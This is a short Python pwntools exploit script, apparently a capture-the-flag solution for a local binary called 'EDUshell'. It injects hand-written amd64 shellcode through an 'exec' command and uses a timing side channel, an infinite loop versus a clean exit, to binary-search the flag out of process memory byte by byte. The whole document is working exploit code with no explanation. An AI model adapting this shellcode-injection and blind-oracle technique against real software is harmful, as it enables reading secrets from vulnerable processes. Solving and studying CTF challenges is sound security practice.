from pwn import *

context.arch = 'amd64'

###Addr
shellcode_ret_offset = 0x14c9
flag_string_offset = 0x40e0

###Exploit
flag = ''
target_idx = 0
while True:
    lowbnd = 0x1f
    upbnd = 0x7e
    while lowbnd+1!=upbnd:
        r = process('./EDUshell')
        r.sendlineafter('$ ','loadflag')
        guess = (lowbnd+upbnd)//2
        shellcode = asm(f'''
                         mov rdi, qword ptr [rsp]
                         sub rdi, {0x01010101+shellcode_ret_offset}
                         add rdi, {0x01010101+flag_string_offset+target_idx}
                         mov al, {guess}
                         cmp al, byte ptr [rdi]
                         jl INFLOOP
                         xor eax, eax
                         mov al, 0x3c
                         xor rdi, rdi
                         syscall
                         INFLOOP:
                            nop
                            jmp INFLOOP
                         ''')
        r.sendline(b'exec '+shellcode)
        try:
            r.recv(timeout=0.5)
            lowbnd = guess
        except:
            upbnd = guess
        r.close()
    flag+=chr(upbnd)
    print(flag)
    if flag[target_idx]=='}':
        break
    target_idx+=1
print(flag)
